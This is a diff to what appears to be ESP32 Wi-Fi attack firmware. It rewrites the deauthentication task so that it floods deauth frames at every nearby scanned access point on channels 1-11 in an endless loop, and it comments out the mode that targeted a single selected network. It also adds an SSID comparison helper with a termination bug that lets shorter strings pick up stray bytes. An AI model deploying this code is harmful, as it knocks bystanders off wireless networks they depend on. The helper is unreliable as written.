@@ -11,6 +11,7 @@
 #include <sys/time.h>
 #include <string.h>
 #include <esp_random.h>
+#include <ctype.h>
 #include <stdio.h>
 #include "managers/settings_manager.h"
 
@@ -32,6 +33,25 @@ typedef enum {
     COMPANY_ACTIONTEC,
     COMPANY_UNKNOWN
 } ECompany;
+
+static void tolower_str(const uint8_t *src, char *dst) {
+    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
+        dst[i] = tolower((char)src[i]);
+    }
+    dst[32] = '\0'; // Ensure null-termination
+}
+
+static int compare_ap_ssid_case_insensitive(const wifi_ap_record_t *ap1, const wifi_ap_record_t *ap2) {
+    char ssid1_lower[33];
+    char ssid2_lower[33];
+
+    
+    tolower_str(ap1->ssid, ssid1_lower);
+    tolower_str(ap2->ssid, ssid2_lower);
+
+    
+    return strcmp(ssid1_lower, ssid2_lower);
+}
 
 // OUI lists for each company
 const char *dlink_ouis[] = {
@@ -431,27 +451,24 @@ void wifi_deauth_task(void *param) {
         return;
     }
 
-
     while (1) {
-        if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL
+        // if (strlen((const char*)selected_ap.ssid) > 0) // not 0 or NULL // TODO Figure out why deauth dosent work on selected ap
+        // {
+        //     for (int y = 1; y < 12; y++)
+        //     {
+        //         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+        //         wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
+        //         vTaskDelay(10 / portTICK_PERIOD_MS);
+        //     }
+        // }
+
+        for (int i = 0; i < ap_count; i++)
         {
             for (int y = 1; y < 12; y++)
             {
                 uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                wifi_manager_broadcast_deauth(selected_ap.bssid, y, broadcast_mac);
+                wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
                 vTaskDelay(10 / portTICK_PERIOD_MS);
-            }
-        }
-        else 
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                for (int y = 1; y < 12; y++)
-                {
-                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(10 / portTICK_PERIOD_MS);
-                }
             }
         }
     }
